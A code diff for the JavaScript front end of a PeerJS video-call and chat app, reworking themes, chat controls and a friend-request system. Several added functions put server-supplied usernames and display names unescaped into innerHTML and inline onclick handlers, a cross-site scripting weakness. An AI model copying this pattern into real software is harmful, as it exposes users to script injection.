             showToast('⚠️ Could not start PiP Mode');
         }
     });
 }
-if (remoteVideo) {
-    remoteVideo.addEventListener('enterpictureinpicture', () => {
-        if (togglePipBtn) togglePipBtn.classList.add('active');
-        showToast('📺 Floating PiP Mode Active');
-    });
-    remoteVideo.addEventListener('leavepictureinpicture', () => {
-        if (togglePipBtn) togglePipBtn.classList.remove('active');
+
+// ============ CHAT PANEL TOGGLER (BOTTOM SHEET DRAWER) ============
+if (toggleChatBtn) {
+    toggleChatBtn.addEventListener('click', () => { 
+        if (chatPanel) chatPanel.classList.toggle('hidden'); 
+        toggleChatBtn.classList.toggle('ctrl-btn-active'); 
     });
 }
 
-// ============ AUTOMATIC PIP ON TAB/APP SWITCH ============
-document.addEventListener('visibilitychange', async () => {
-    try {
-        if (document.visibilityState === 'hidden' && isCallActive) {
-            if (remoteVideo && remoteVideo.readyState >= 2 && remoteVideo.srcObject && !document.pictureInPictureElement) {
-                if ('autoPictureInPicture' in remoteVideo) {
-                    remoteVideo.autoPictureInPicture = true;
-                } else if (document.pictureInPictureEnabled) {
-                    await remoteVideo.requestPictureInPicture();
-                    console.log('📺 Auto-PiP triggered on tab/app switch');
-                }
-            }
-        }
-    } catch (err) {
-        console.log('Auto-PiP fallback note:', err);
-    }
-});
-
-function updateControlButtons() {
-    toggleMicBtn.className = 'control-btn' + (isMicOn ? '' : ' off');
-    toggleMicBtn.innerHTML = isMicOn ? '<i class="fas fa-microphone"></i>' : '<i class="fas fa-microphone-slash"></i>';
-    toggleCamBtn.className = 'control-btn' + (isCamOn ? '' : ' off');
-    toggleCamBtn.innerHTML = isCamOn ? '<i class="fas fa-video"></i>' : '<i class="fas fa-video-slash"></i>';
-    toggleScreenBtn.className = 'control-btn' + (isScreenSharing ? ' active' : '');
-    if (togglePipBtn) togglePipBtn.className = 'control-btn' + (document.pictureInPictureElement ? ' active' : '');
-}
-
-// ============ CHAT ============
-toggleChatBtn.addEventListener('click', () => { chatPanel.classList.toggle('hidden'); toggleChatBtn.classList.toggle('active'); });
 let isBurnChatActive = false;
 const toggleBurnChatBtn = document.getElementById('toggleBurnChatBtn');
 if (toggleBurnChatBtn) {
     toggleBurnChatBtn.addEventListener('click', () => {
         isBurnChatActive = !isBurnChatActive;
-        toggleBurnChatBtn.style.color = isBurnChatActive ? '#ff2d75' : '#a0a0cc';
+        toggleBurnChatBtn.style.color = isBurnChatActive ? '#ff2d75' : '#8696a0';
         toggleBurnChatBtn.style.textShadow = isBurnChatActive ? '0 0 10px #ff2d75' : 'none';
         showToast(isBurnChatActive ? '🔥 View Once Chat Mode ON (10s Auto-Delete)' : '💬 Normal Chat Mode ON');
     });
 }
 
-closeChatBtn.addEventListener('click', () => { chatPanel.classList.add('hidden'); toggleChatBtn.classList.remove('active'); });
-sendChatBtn.addEventListener('click', sendTextMessage);
-chatInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') sendTextMessage(); });
+if (closeChatBtn) {
+    closeChatBtn.addEventListener('click', () => { 
+        if (chatPanel) chatPanel.classList.add('hidden'); 
+        if (toggleChatBtn) toggleChatBtn.classList.remove('ctrl-btn-active'); 
+    });
+}
+if (sendChatBtn) sendChatBtn.addEventListener('click', sendTextMessage);
+if (chatInput) chatInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') sendTextMessage(); });
 
 function sendTextMessage() {
     const text = chatInput.value.trim();
@@ -1115,7 +945,7 @@ function addChatMessage(text, isSent, isBurn = false) {
     chatMessages.scrollTop = chatMessages.scrollHeight;
 }
 
-// ============ FILE SHARING (IN-CALL) ============
+// ============ FILE SHARING ============
 attachFileBtn.addEventListener('click', () => fileInput.click());
 fileInput.addEventListener('change', () => {
     const files = fileInput.files;
@@ -1199,21 +1029,15 @@ function addFileToChat(fileName, fileSize, mimeType, arrayBuffer, isSent, blobUr
         if (isSent && arrayBuffer) { imgSrc = URL.createObjectURL(new Blob([arrayBuffer], { type: mimeType })); }
         else if (blobUrl) { imgSrc = blobUrl; }
         if (imgSrc) {
-            const img = document.createElement('img'); img.src = imgSrc; img.className = 'chat-image'; img.style.maxWidth = '260px'; img.alt = fileName;
-            img.addEventListener('click', () => {
-                const ov = document.createElement('div'); ov.className = 'image-preview-overlay';
-                ov.innerHTML = `<img src="${imgSrc}" alt="${fileName}">`;
-                ov.addEventListener('click', () => ov.remove());
-                document.body.appendChild(ov);
-            });
+            const img = document.createElement('img'); img.src = imgSrc; img.className = 'chat-image'; img.style.maxWidth = '200px'; img.alt = fileName;
             div.appendChild(img);
             const dl = document.createElement('a'); dl.href = imgSrc; dl.download = fileName; dl.className = 'file-download';
-            dl.innerHTML = `<i class="fas fa-download"></i> ${fileName} (${formatFileSize(fileSize)})`;
+            dl.innerHTML = `<i class="fas fa-download"></i> Download`;
             div.appendChild(document.createElement('br')); div.appendChild(dl);
         }
     } else {
         const fb = document.createElement('div'); fb.className = 'file-bubble';
-        const ic = document.createElement('i'); ic.className = 'fas ' + getFileIcon(fileName); ic.style.color = isSent ? '#fff' : 'var(--neon-cyan)';
+        const ic = document.createElement('i'); ic.className = 'fas ' + getFileIcon(fileName); ic.style.color = isSent ? '#fff' : 'var(--wa-teal)';
         const info = document.createElement('div'); info.className = 'file-info';
         const ns = document.createElement('span'); ns.className = 'file-name'; ns.textContent = fileName;
         const ss = document.createElement('span'); ss.className = 'file-size'; ss.textContent = formatFileSize(fileSize);
@@ -1251,27 +1075,23 @@ function checkUrlForRoom() {
     document.addEventListener('touchend', () => { drag = false; w.style.transition = ''; });
 })();
 
-// ============ SUPER ADVANCED STARTUP FEATURES (THEMES, WHITEBOARD, EMOJI, SOUNDS) ============
+// ============ THEMES ============
 function setTheme(theme) {
     const root = document.documentElement;
     if (theme === 'cyan') {
-        root.style.setProperty('--neon-cyan', '#00f0ff');
-        root.style.setProperty('--neon-purple', '#b14dff');
-        root.style.setProperty('--neon-green', '#39ff14');
+        root.style.setProperty('--wa-teal', '#00f0ff');
+        root.style.setProperty('--wa-teal-dark', '#004c66');
     } else if (theme === 'green') {
-        root.style.setProperty('--neon-cyan', '#39ff14');
-        root.style.setProperty('--neon-purple', '#00ff66');
-        root.style.setProperty('--neon-green', '#00f0ff');
+        root.style.setProperty('--wa-teal', '#00a884');
+        root.style.setProperty('--wa-teal-dark', '#005c4b');
     } else if (theme === 'pink') {
-        root.style.setProperty('--neon-cyan', '#ff2d75');
-        root.style.setProperty('--neon-purple', '#ff007f');
-        root.style.setProperty('--neon-green', '#ffd700');
+        root.style.setProperty('--wa-teal', '#ff2d75');
+        root.style.setProperty('--wa-teal-dark', '#660024');
     } else if (theme === 'gold') {
-        root.style.setProperty('--neon-cyan', '#ffd700');
-        root.style.setProperty('--neon-purple', '#ff8c00');
-        root.style.setProperty('--neon-green', '#00f0ff');
+        root.style.setProperty('--wa-teal', '#ffd700');
+        root.style.setProperty('--wa-teal-dark', '#664c00');
     }
-    showToast(`🎨 Switched to ${theme.toUpperCase()} Theme`);
+    showToast(`🎨 Theme changed: ${theme.toUpperCase()}`);
 }
 window.setTheme = setTheme;
 
@@ -1350,12 +1170,11 @@ const closeWhiteboardBtn = document.getElementById('closeWhiteboardBtn');
 const wbCanvas = document.getElementById('whiteboardCanvas');
 const clearWhiteboardBtn = document.getElementById('clearWhiteboardBtn');
 let ctxWb = wbCanvas ? wbCanvas.getContext('2d') : null;
-let isDrawingWb = false, lastWbX = 0, lastWbY = 0, currentWbColor = '#00f0ff';
+let isDrawingWb = false, lastWbX = 0, lastWbY = 0, currentWbColor = '#00a884';
 let isDirtyWb = false;
 
 function autoSaveWhiteboardToTelegram(reason = "auto") {
     if (!wbCanvas || !isDirtyWb) return;
-    console.log(`🤖 Auto-saving whiteboard to Telegram in background (${reason})...`);
     wbCanvas.toBlob(async (blob) => {
         const formData = new FormData();
         formData.append('file', blob, `whiteboard_${currentRoomId || 'snapshot'}_${reason}.png`);
@@ -1363,7 +1182,6 @@ function autoSaveWhiteboardToTelegram(reason = "auto") {
         formData.append('viewOnce', 'false');
         try {
             await fetch(`${SERVER_URL}/api/upload-file`, { method: 'POST', body: formData });
-            console.log('✅ Whiteboard auto-saved to Telegram!');
         } catch (e) {}
     }, 'image/png');
     isDirtyWb = false;
@@ -1426,35 +1244,10 @@ function drawRemoteWb(x1, y1, x2, y2, color, size) {
     drawWbLine(x1, y1, x2, y2, color, size);
 }
 
-// ============ INIT ============
-checkUrlForRoom();
-checkFilePreview();
-checkCyberSession();
-
-// ============ SNAPCHAT-STYLE CYBER SPACE ENGINE ============
-function switchAuthTab(tab) {
-    const tabLogin = document.getElementById('authTabLogin');
-    const tabRegister = document.getElementById('authTabRegister');
-    const formLogin = document.getElementById('cyberLoginForm');
-    const formRegister = document.getElementById('cyberRegisterForm');
-
-    if (tab === 'login') {
-        tabLogin.classList.add('active');
-        tabRegister.classList.remove('active');
-        formLogin.classList.remove('hidden');
-        formRegister.classList.add('hidden');
-    } else {
-        tabLogin.classList.remove('active');
-        tabRegister.classList.add('active');
-        formLogin.classList.add('hidden');
-        formRegister.classList.remove('hidden');
-    }
-}
-window.switchAuthTab = switchAuthTab;
-
+// ============ APP ACTIONS & PEER LOGICS (WHATSAPP SPECIFIC) ============
 async function handleCyberRegister(e) {
     e.preventDefault();
-    const username = document.getElementById('regUsername').value.trim().lower();
+    const username = document.getElementById('regUsername').value.trim().toLowerCase();
     const displayName = document.getElementById('regDisplayName').value.trim();
     const password = document.getElementById('regPassword').value;
 
@@ -1479,7 +1272,7 @@ window.handleCyberRegister = handleCyberRegister;
 
 async function handleCyberLogin(e) {
     e.preventDefault();
-    const username = document.getElementById('loginUsername').value.trim().lower();
+    const username = document.getElementById('loginUsername').value.trim().toLowerCase();
     const password = document.getElementById('loginPassword').value;
 
     try {
@@ -1505,6 +1298,7 @@ function loginSession(user) {
     currentUser = user;
     localStorage.setItem('cyberUser', JSON.stringify(user));
     initCyberDashboard();
+    switchAppTab('chats');
 }
 
 function handleCyberLogout() {
@@ -1520,20 +1314,52 @@ function handleCyberLogout() {
         peer = null;
     }
 
+    // Toggle Tab Views Back to Onboarding states
+    document.getElementById('chatsLoggedOutCard').classList.remove('hidden');
+    document.getElementById('chatsLoggedInDashboard').classList.add('hidden');
+    document.getElementById('callsLoggedOutCard').classList.remove('hidden');
+    document.getElementById('callsLoggedInDashboard').classList.add('hidden');
+    document.getElementById('appFab').classList.add('hidden');
+
     document.getElementById('cyberAuthBox').classList.remove('hidden');
     document.getElementById('cyberDashboardBox').classList.add('hidden');
+    
+    // Reset Navbar Badge
+    const anonNavBadge = document.getElementById('anonNavBadge');
+    const cyberNavProfile = document.getElementById('cyberNavProfile');
+    if (anonNavBadge) anonNavBadge.classList.remove('hidden');
+    if (cyberNavProfile) cyberNavProfile.classList.add('hidden');
     
     // Reset forms
     document.getElementById('cyberLoginForm').reset();
     document.getElementById('cyberRegisterForm').reset();
+    switchAppTab('profile');
 }
 window.handleCyberLogout = handleCyberLogout;
 
 function initCyberDashboard() {
+    // Show Dashboards, Hide Onboardings
+    document.getElementById('chatsLoggedOutCard').classList.add('hidden');
+    document.getElementById('chatsLoggedInDashboard').classList.remove('hidden');
+    document.getElementById('callsLoggedOutCard').classList.add('hidden');
+    document.getElementById('callsLoggedInDashboard').classList.remove('hidden');
+    document.getElementById('appFab').classList.remove('hidden');
+
     document.getElementById('cyberAuthBox').classList.add('hidden');
     document.getElementById('cyberDashboardBox').classList.remove('hidden');
     document.getElementById('cyberProfileName').textContent = currentUser.display_name;
     document.getElementById('cyberProfileId').textContent = '@' + currentUser.username;
+
+    // Update Navbar with permanent Cyber Profile Badge (Fail-safe check)
+    const anonNavBadge = document.getElementById('anonNavBadge');
+    const cyberNavProfile = document.getElementById('cyberNavProfile');
+    const cyberNavId = document.getElementById('cyberNavId');
+
+    if (anonNavBadge) anonNavBadge.classList.add('hidden');
+    if (cyberNavProfile) {
+        cyberNavProfile.classList.remove('hidden');
+        if (cyberNavId) cyberNavId.textContent = '@' + currentUser.username;
+    }
 
     // Start background heartbeats & friends polling
     sendHeartbeat();
@@ -1560,26 +1386,38 @@ async function sendHeartbeat() {
 async function pollFriendsList() {
     if (!currentUser) return;
     try {
+        // 1. Poll Friends List
         const resp = await fetch(`${SERVER_URL}/api/friends/list?username=${currentUser.username}`);
         const result = await resp.json();
         if (resp.ok && result.friends) {
             renderFriendsList(result.friends);
         }
+
+        // 2. Poll Pending Friend Requests
+        const reqResp = await fetch(`${SERVER_URL}/api/friends/requests-pending?username=${currentUser.username}`);
+        const reqResult = await reqResp.json();
+        if (reqResp.ok && reqResult.requests) {
+            renderFriendRequests(reqResult.requests);
+        }
     } catch (e) { }
 }
 
 function renderFriendsList(friends) {
-    const listEl = document.getElementById('cyberFriendsList');
+    const chatsListEl = document.getElementById('cyberFriendsChatsList');
+    const callsListEl = document.getElementById('cyberFriendsCallsList');
+    
     if (!friends || friends.length === 0) {
-        listEl.innerHTML = '<p class="cyber-empty">No friends added yet. Add friends to start chatting!</p>';
+        const emptyHtml = '<p class="cyber-empty">No conversations yet. Search friends to start chatting!</p>';
+        chatsListEl.innerHTML = emptyHtml;
+        callsListEl.innerHTML = '<p class="cyber-empty">No online contacts available</p>';
         return;
     }
 
-    listEl.innerHTML = '';
+    // 1. Render Chats Tab List
+    chatsListEl.innerHTML = '';
     friends.forEach(f => {
         const item = document.createElement('div');
         item.className = 'cyber-item';
-        
         const statusClass = f.is_online ? 'online' : 'offline';
         const statusText = f.is_online ? 'Online' : 'Offline';
 
@@ -1592,17 +1430,145 @@ function renderFriendsList(friends) {
                 </div>
             </div>
             <div class="cyber-actions">
-                <button onclick="startFriendChat('${f.username}')" class="btn btn-neon-outline btn-small" style="padding: 6px 12px;" title="Chat with friend">
+                <button onclick="startFriendChat('${f.username}')" class="btn btn-whatsapp-outline btn-small" style="padding: 6px 10px;" title="Chat with friend">
                     <i class="fas fa-comment-dots"></i>
                 </button>
-                <button onclick="startFriendCall('${f.username}')" class="btn btn-neon btn-small" style="padding: 6px 12px;" title="Call friend" ${f.is_online ? '' : 'disabled style="opacity:0.5; cursor:not-allowed;"'}>
-                    <i class="fas fa-video"></i>
+                <button onclick="removeCyberFriend('${f.username}')" class="btn btn-danger-app btn-small" style="padding: 6px 10px; background: rgba(255, 45, 117, 0.15); border: 1px solid rgba(255, 45, 117, 0.45); color: var(--neon-pink);" title="Remove Friend">
+                    <i class="fas fa-user-minus"></i>
                 </button>
+            </div>
+        `;
+        chatsListEl.appendChild(item);
+    });
+
+    // 2. Render Calls Tab List
+    callsListEl.innerHTML = '';
+    friends.forEach(f => {
+        const item = document.createElement('div');
+        item.className = 'cyber-item';
+        const statusClass = f.is_online ? 'online' : 'offline';
+        const statusText = f.is_online ? 'Online' : 'Offline';
+
+        item.innerHTML = `
+            <div class="cyber-item-info">
+                <div class="cyber-item-name">${f.display_name}</div>
+                <div class="cyber-item-id">
+                    <span class="status-dot ${statusClass}"></span>
+                    @${f.username} (${statusText})
+                </div>
+            </div>
+            <div class="cyber-actions">
+                <button onclick="startFriendCall('${f.username}')" class="btn btn-whatsapp btn-small" style="padding: 6px 14px;" title="Call friend" ${f.is_online ? '' : 'disabled style="opacity:0.5; cursor:not-allowed;"'}>
+                    <i class="fas fa-video"></i> Call
+                </button>
+            </div>
+        `;
+        callsListEl.appendChild(item);
+    });
+}
+
+function renderFriendRequests(requests) {
+    const sec = document.getElementById('cyberIncomingRequestsSection');
+    const listEl = document.getElementById('cyberIncomingRequestsList');
+    
+    if (!requests || requests.length === 0) {
+        sec.classList.add('hidden');
+        return;
+    }
+    
+    sec.classList.remove('hidden');
+    listEl.innerHTML = '';
+    
+    requests.forEach(r => {
+        const item = document.createElement('div');
+        item.className = 'cyber-item';
+        item.innerHTML = `
+            <div class="cyber-item-info">
+                <div class="cyber-item-name">${r.display_name}</div>
+                <div class="cyber-item-id">@${r.username}</div>
+            </div>
+            <div class="cyber-actions" style="display:flex; gap:6px;">
+                <button onclick="acceptFriendRequest('${r.username}')" class="btn btn-whatsapp btn-small" style="padding: 6px 10px; font-size: 0.75rem;" title="Accept request"><i class="fas fa-check"></i> Accept</button>
+                <button onclick="declineFriendRequest('${r.username}')" class="btn btn-danger-app btn-small" style="padding: 6px 10px; font-size: 0.75rem; background: rgba(255, 45, 117, 0.15); border: 1px solid rgba(255, 45, 117, 0.45); color: var(--neon-pink);" title="Decline request"><i class="fas fa-times"></i> Decline</button>
             </div>
         `;
         listEl.appendChild(item);
     });
 }
+window.renderFriendRequests = renderFriendRequests;
+
+async function acceptFriendRequest(senderUsername) {
+    if (!currentUser) return;
+    try {
+        const resp = await fetch(`${SERVER_URL}/api/friends/accept-request`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username: currentUser.username, sender_username: senderUsername })
+        });
+        const result = await resp.json();
+        if (resp.ok && result.status === 'ok') {
+            showToast(`✅ You are now friends with @${senderUsername}!`);
+            pollFriendsList();
+            if (document.getElementById('cyberSearchInput').value.trim()) {
+                handleCyberSearch();
+            }
+        } else {
+            showToast('❌ ' + (result.error || 'Failed to accept request'));
+        }
+    } catch (e) {
+        showToast('❌ Connection error');
+    }
+}
+window.acceptFriendRequest = acceptFriendRequest;
+
+async function declineFriendRequest(senderUsername) {
+    if (!currentUser) return;
+    try {
+        const resp = await fetch(`${SERVER_URL}/api/friends/decline-request`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username: currentUser.username, sender_username: senderUsername })
+        });
+        const result = await resp.json();
+        if (resp.ok && result.status === 'ok') {
+            showToast(`Declined friend request from @${senderUsername}`);
+            pollFriendsList();
+            if (document.getElementById('cyberSearchInput').value.trim()) {
+                handleCyberSearch();
+            }
+        } else {
+            showToast('❌ ' + (result.error || 'Failed to decline request'));
+        }
+    } catch (e) {
+        showToast('❌ Connection error');
+    }
+}
+window.declineFriendRequest = declineFriendRequest;
+
+async function removeCyberFriend(friendUsername) {
+    if (!currentUser) return;
+    if (!confirm(`Are you sure you want to remove @${friendUsername} from your friends list?`)) return;
+    try {
+        const resp = await fetch(`${SERVER_URL}/api/friends/remove`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username: currentUser.username, friend_username: friendUsername })
+        });
+        const result = await resp.json();
+        if (resp.ok && result.status === 'ok') {
+            showToast(`🗑️ Removed @${friendUsername} from friends list`);
+            pollFriendsList();
+            if (document.getElementById('cyberSearchInput').value.trim()) {
+                handleCyberSearch();
+            }
+        } else {
+            showToast('❌ ' + (result.error || 'Failed to remove friend'));
+        }
+    } catch (e) {
+        showToast('❌ Connection error');
+    }
+}
+window.removeCyberFriend = removeCyberFriend;
 
 async function handleCyberSearch() {
     const query = document.getElementById('cyberSearchInput').value.trim();
@@ -1641,10 +1607,14 @@ function renderSearchResults(results) {
         item.className = 'cyber-item';
 
         let actionHtml = '';
-        if (r.is_friend) {
-            actionHtml = '<span style="font-size:0.8rem; color:var(--text-muted); font-weight:600;"><i class="fas fa-check-circle"></i> Friends</span>';
+        if (r.status_state === 'friends') {
+            actionHtml = '<span style="font-size:0.8rem; color:var(--wa-teal); font-weight:600;"><i class="fas fa-check-circle"></i> Friends</span>';
+        } else if (r.status_state === 'sent') {
+            actionHtml = '<span style="font-size:0.85rem; color:var(--text-secondary); font-weight:600;"><i class="fas fa-paper-plane"></i> Sent</span>';
+        } else if (r.status_state === 'received') {
+            actionHtml = `<button onclick="acceptFriendRequest('${r.username}')" class="btn btn-whatsapp btn-small" style="padding: 6px 12px;"><i class="fas fa-check"></i> Accept</button>`;
         } else {
-            actionHtml = `<button onclick="addCyberFriend('${r.username}', this)" class="btn btn-neon btn-small" style="padding: 6px 12px;"><i class="fas fa-user-plus"></i> Add</button>`;
+            actionHtml = `<button onclick="addCyberFriend('${r.username}', this)" class="btn btn-whatsapp btn-small" style="padding: 6px 12px;"><i class="fas fa-user-plus"></i> Add</button>`;
         }
 
         item.innerHTML = `
@@ -1673,9 +1643,9 @@ async function addCyberFriend(friendUsername, btn) {
         });
         const result = await resp.json();
         if (resp.ok && result.status === 'ok') {
-            showToast(`✅ You are now friends with @${friendUsername}!`);
+            showToast(`✅ Friend request sent to @${friendUsername}!`);
             pollFriendsList();
-            handleCyberSearch(); // Refresh search view
+            handleCyberSearch();
         } else {
             showToast('❌ ' + (result.error || 'Failed to add friend'));
             btn.disabled = false;
@@ -1718,9 +1688,8 @@ function startFriendCall(friendUsername) {
     showToast(`📹 Calling @${friendUsername}...`);
     showPage(roomPage);
     roomIdDisplay.textContent = "DIRECT CALL";
-    waitingScreen.style.display = 'flex'; // Show waiting till they answer
+    waitingScreen.style.display = 'flex';
     
-    // Call peer
     callPeer(friendUsername);
 }
 window.startFriendCall = startFriendCall;
@@ -1752,7 +1721,13 @@ function initCyberPeer() {
     peer.on('error', (err) => {
         console.error('Cyber Peer error:', err.type, err);
         if (err.type === 'unavailable-id') {
-            showToast('⚠️ Your Cyber ID is active on another device.');
+            showToast('🔄 Cyber ID resetting, auto-reconnecting in 5s...');
+            setTimeout(() => {
+                if (currentUser) {
+                    console.log('🔄 Retrying PeerJS connection...');
+                    initCyberPeer();
+                }
+            }, 5000);
         } else {
             showToast('Cyber Space connection issue: ' + err.type);
         }
@@ -1762,7 +1737,6 @@ function initCyberPeer() {
         if (peer && !peer.destroyed) peer.reconnect();
     });
 
-    // Handle Direct P2P Connections & Calls
     peer.on('call', handleIncomingCyberCall);
     peer.on('connection', handleIncomingCyberConnection);
 }
@@ -1785,7 +1759,6 @@ function playRingtone() {
             osc1.type = 'sine';
             osc2.type = 'sine';
             
-            // Dual frequency for standard ringtone sound
             osc1.frequency.setValueAtTime(440, ringtoneAudioCtx.currentTime);
             osc2.frequency.setValueAtTime(480, ringtoneAudioCtx.currentTime);
             
@@ -1836,10 +1809,8 @@ function handleIncomingCyberCall(call) {
     const declineBtn = document.getElementById('declineCallBtn');
 
     textEl.textContent = `@${call.peer} is calling you...`;
-    modal.style.display = 'flex';
     modal.classList.remove('hidden');
 
-    // Clean up previous listeners if any
     const cleanAccept = acceptBtn.cloneNode(true);
     const cleanDecline = declineBtn.cloneNode(true);
     acceptBtn.parentNode.replaceChild(cleanAccept, acceptBtn);
@@ -1847,7 +1818,6 @@ function handleIncomingCyberCall(call) {
 
     cleanAccept.addEventListener('click', async () => {
         stopRingtone();
-        modal.style.display = 'none';
         modal.classList.add('hidden');
         showPage(roomPage);
         roomIdDisplay.textContent = "DIRECT CALL";
@@ -1868,7 +1838,6 @@ function handleIncomingCyberCall(call) {
 
     cleanDecline.addEventListener('click', () => {
         stopRingtone();
-        modal.style.display = 'none';
         modal.classList.add('hidden');
         call.close();
         showToast('Call declined');
@@ -1891,5 +1860,20 @@ function checkCyberSession() {
     if (stored) {
         currentUser = JSON.parse(stored);
         initCyberDashboard();
+    } else {
+        switchAppTab('profile'); // Focus on Login if not logged in
     }
 }
+
+function updateControlButtons() {
+    toggleMicBtn.className = 'ctrl-btn' + (isMicOn ? ' ctrl-btn-active' : '');
+    toggleMicBtn.innerHTML = isMicOn ? '<i class="fas fa-microphone"></i>' : '<i class="fas fa-microphone-slash"></i>';
+    toggleCamBtn.className = 'ctrl-btn' + (isCamOn ? ' ctrl-btn-active' : '');
+    toggleCamBtn.innerHTML = isCamOn ? '<i class="fas fa-video"></i>' : '<i class="fas fa-video-slash"></i>';
+    toggleScreenBtn.className = 'ctrl-btn' + (isScreenSharing ? ' ctrl-btn-active' : '');
+}
+
+// ============ INIT ============
+checkUrlForRoom();
+checkFilePreview();
+checkCyberSession();
